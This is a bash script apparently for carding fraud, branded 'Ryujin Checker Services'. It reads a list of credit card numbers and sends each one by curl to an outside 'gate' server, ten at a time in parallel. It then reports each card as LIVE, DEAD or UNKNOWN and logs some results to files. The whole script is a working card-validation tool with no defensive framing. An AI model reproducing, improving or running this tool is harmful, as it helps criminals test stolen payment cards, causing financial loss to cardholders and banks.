#!/bin/bash
#######################################
# @ Ryujin Checker Services @
# @ Created with <3 by Uzumaki Nagato.
######################################
m="\033[1;31m"
w="\033[1;37m"
n="\033[0m"
h="\033[1;32m"
k="\033[1;33m"

banner_ryu()
{

echo -e $m" ____               ____ _               _     "$n
echo -e $m"|  _ \ _   _ _   _ / ___| |__   ___  ___| | __ "$n
echo -e $m"| |_) | | | | | | | |   | '_ \ / _ \/ __| |/ / "$n
echo -e $w"|  _ <| |_| | |_| | |___| | | |  __/ (__|   <  "$n
echo -e $w"|_| \_\\\\\\__, |\__,_|\____|_| |_|\___|\___|_|\_\ "$n
echo -e $w"       |___/                                   "$n
echo -e $k"================================================="$n
echo -e $h"|| RyuJin Checker Services 2021 -----------------"$n
echo -e $k"================================================="$n

}

ngecek_ryu()
{
	local cek=$(curl -s "https://check.shinryujin.net/gates/ccn2.php?cclist=${1}" )
	local status=$(echo $cek | jq ".statusCode")
	local msg=$(echo $cek | jq ".checking_status")

	if [[ $msg == \""declined"\" || $msg == \""proxy_die"\" || $msg == \""not_sup"\" ]]; then
		echo -e $k"[RYUJIN] $m ${1} $n => $m DEAD $n [ Reason : $msg ] $n"

		if [[ $msg == \""proxy_die\"" ]]; then
			echo ${1} >> proxy_die_list.txt
		fi
	else if [[ $msg == \""live"\" ]]; then
		echo -e $k"[RYUJIN] $h ${1} $n => $h LIVE $n [ Reason : $msg ] $n"
	else
		echo -e $k"[RYUJIN] $w ${1} $n => $w UNKNOWN $n [ Reason : $msg ] $n"
		echo ${1} >> unknown_list.txt
	fi
fi
}

init_ryu(){
	echo ""
	echo ""
	echo -n -e $h"[RYUJIN]$h CC LIST >>"; read cclist
	echo -e $n
	if [[ ! -f $cclist ]]; then
		echo -e $m"[-] $cclist FILE NOT EXISTS !"$n
		exit 0
	fi
	catlist=$(cat $cclist | tr "\n" "\n")

	for cc in $catlist
	do
		((cthread=cthread%10)); ((cthread++==0)) && wait
		ngecek_ryu ${cc} &
	done

}

banner_ryu
init_ryu
